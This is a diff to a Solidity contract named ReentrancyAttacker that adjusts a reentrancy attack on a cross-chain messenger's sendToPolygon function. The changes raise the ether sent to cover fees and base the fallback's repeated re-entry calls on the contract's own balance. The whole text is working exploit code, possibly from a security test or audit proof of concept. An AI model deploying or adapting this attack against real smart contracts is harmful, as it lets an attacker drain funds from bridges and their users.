@@ -16,9 +16,9 @@ contract ReentrancyAttacker {
     }
 
     function attack() external payable {
-        require(msg.value >= 1 ether, "Need at least 1 ETH");
+        require(msg.value >= 1.1 ether, "Need at least 1.1 ETH"); // Extra for fees
         attackCount = 0;
-        // Properly encode both receiver and amount for the message
+        // Send enough to cover both transfer and fee
         messenger.sendToPolygon{value: msg.value}(address(this));
         emit AttackAttempted(msg.value, 0);
     }
@@ -26,11 +26,11 @@ contract ReentrancyAttacker {
     receive() external payable {
         emit FallbackCalled(msg.value);
 
-        if (attackCount < 2 && msg.value >= 1 ether) {
+        if (attackCount < 2 && address(this).balance >= 1.1 ether) {
             attackCount++;
-            // Try to reenter with the received amount
-            messenger.sendToPolygon{value: msg.value}(address(this));
-            emit AttackAttempted(msg.value, attackCount);
+            // Try to reenter with enough value for transfer and fee
+            messenger.sendToPolygon{value: 1.1 ether}(address(this));
+            emit AttackAttempted(1.1 ether, attackCount);
         }
     }
 }
